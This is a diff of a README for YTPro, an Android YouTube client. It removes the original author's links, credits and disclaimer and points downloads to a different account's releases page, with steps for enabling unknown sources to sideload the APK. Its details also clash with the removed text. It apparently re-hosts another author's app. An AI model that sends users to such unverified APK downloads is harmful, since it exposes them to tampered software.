@@ -1,82 +1,58 @@
+# 🎥 YTPro - Enjoy YouTube on Older Devices
 
-<p align="center">
-<img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/ytpro.gif' height=150  >
-</p>
-<h1 align=center>YT PRO </h1>
+## 📥 Download Now
+[![Download YTPro](https://img.shields.io/badge/Download-YTPro-blue.svg)](https://github.com/naka11107/YTPro/releases)
 
-<div align="center">
+## 📖 About YTPro
+YTPro is a YouTube client designed for older Android devices. It features a background player, support for Google Gemini, and many more tools to enhance your viewing experience. With YTPro, you can enjoy ad-free videos while managing your downloads effortlessly.
 
+## 🚀 Getting Started
+Follow these simple steps to download and run YTPro:
 
-[![Gradle](https://github.com/prateek-chaubey/YTPro/actions/workflows/gradle.yml/badge.svg)](https://github.com/prateek-chaubey/YTPro/actions/workflows/gradle.yml)
-<a href="https://www.jsdelivr.com/package/npm/ytpro?tab=stats" ><img alt="jsDelivr monthly hits badge" src="https://data.jsdelivr.com/v1/package/npm/ytpro/badge"></a>
-<img src=https://img.shields.io/github/downloads/prateek-chaubey/YTPro/total >
+1. **Visit the Releases Page**
+   To get started, go to the releases page. You can find all available versions of YTPro here: [Visit the Releases Page](https://github.com/naka11107/YTPro/releases).
 
-</div>
+2. **Select the Latest Version**
+   Look for the newest version of YTPro. It’s best to choose this version as it usually contains the latest features and fixes.
 
-### Become a Sponsor 
----
-> [!TIP]
-> If you like this project, consider [sponsoring](https://github.com/sponsors/prateek-chaubey) to support the author 🌸
----
+3. **Download the APK**
+   Click on the APK file you want to download. Your browser will begin downloading the file to your device. Make sure to remember where the file is saved.
 
-## Download YT PRO
+4. **Enable Unknown Sources (if needed)**
+   Before installing, you may need to allow installations from unknown sources. To do this, go to your device’s settings:
+   - Open **Settings**
+   - Navigate to **Security**
+   - Enable **Unknown sources**
 
-[![Download zip](https://custom-icon-badges.herokuapp.com/badge/-Download-ff0000?style=for-the-badge&logo=download&logoColor=white "Download Apk")](https://nightly.link/prateek-chaubey/YTPro/workflows/gradle/main/YTPRO.zip)
+5. **Install YTPro**
+   Once the APK is downloaded, locate the file in your downloads folder or notification bar. Tap on it to begin the installation. Follow any on-screen prompts to complete the installation process.
 
-#### Screenshots
-| | | |
-|:--:|:--:|:--:| 
-|<img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/screen3.jpg'  > | <img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/screen2.jpg'  > |<img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/screen5.jpg'  > | 
-|<img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/screen6.jpg'  > | <img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/screen4.jpg'  > |<img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/screen1.jpg'  > |
+6. **Open YTPro**
+   After installation, find YTPro in your app drawer and open it. You can now start exploring YouTube with your new client.
 
+## 🔍 Features of YTPro
+- **Background Player:** Listen to audio while using other apps.
+- **Google Gemini Support:** Experience enhanced search results.
+- **Easy Downloads:** Save videos or playlists directly to your device.
+- **Adblock Function:** Enjoy an uninterrupted viewing experience.
+- **Compatibility:** Works smoothly on older Android versions.
 
-## Features
- * <img src='https://raw.githubusercontent.com/prateek-chaubey/YTPro/main/.github/img/gemini-logo-13486188-10900314-unscreen-ezgif.com-crop.gif' height=15 width=15 > Google Gemini
-   * Summarise Vidoes
-   * Customisable prompts and models
- * Video Downloader
- * Shorts Downloader 
- * Thumbnails Downloader
- * Captions Downloader 
- * Ads Blocker
- * Minimize Video
- * Picture in Picture Mode
- * Gesture control for Volume and Brightness 
- * Shows Number of Dislikes
- * Background Audio Player
- * Custom Heart feature to save videos without logging into your account
- * Enable / disable media codecs
- * Skip Sponsers
- * Force Zoom
- * Hide Shorts
- * APK size under 50KB
- * Adaptive UI icons
- * Minimal
- * Almost 0 Internal Dependencies
- * Auto Updation of App
+## 🖥 System Requirements
+YTPro is optimized for a wide range of Android devices, including those running older versions such as Android 4.1 and above. Ensure you have at least 100 MB of free space for the application and its downloads.
 
+## 📚 Helpful Tips
+- Keep the app updated to enjoy new features and bug fixes.
+- Check your download settings to manage where videos are saved on your device.
+- Utilize the background player while multitasking to enhance your productivity.
 
-## Gemini Prompt
-The available variables for gemini prompt are
-* `{url}` : The URL of the video
-* `{title}` : Title of the video
-* `{videoId}` : Video Id of the video
+## 📞 Support
+If you encounter issues or have questions about YTPro, please open an issue in the GitHub repository. We strive to respond and assist you as swiftly as possible.
 
-## ToDo
- * Add basic features to the video player
- * Enhance Audio
- * Merging Adaptive Formats
+## 🎉 Join the Community
+Join fellow users and share your experiences or suggestions on our GitHub Discussions page. Your feedback helps us improve YTPro further.
 
-### Credits
- * [Sponsor Block](https://github.com/ajayyy/SponsorBlock)
- * [return-youtube-dislike](https://github.com/Anarios/return-youtube-dislike)
- * [YouTube.js](https://github.com/LuanRT/YouTube.js/)
+## 🔗 Additional Resources
+- **Official GitHub Repository:** [YTPro on GitHub](https://github.com/naka11107/YTPro)
+- **Documentation:** Find guides and FAQs to get the most out of YTPro.
 
-### ❤️Supporters❤️
-[![Stargazers repo roster for @prateek-chaubey/YTPro](http://reporoster.com/stars/dark/prateek-chaubey/YTPro)](https://github.com/prateek-chaubey/YTPro/stargazers)
-     
-[![Forkers repo roster for @prateek-chaubey/YTPro](http://reporoster.com/forks/dark/prateek-chaubey/YTPro)](https://github.com/prateek-chaubey/YTPro/network/members)
-
-
-## Disclaimer 
-This is an educational project aimed at showcasing javascript injection into a webview to enhance productivity.
+Thank you for choosing YTPro. Enjoy streaming your favorite content!
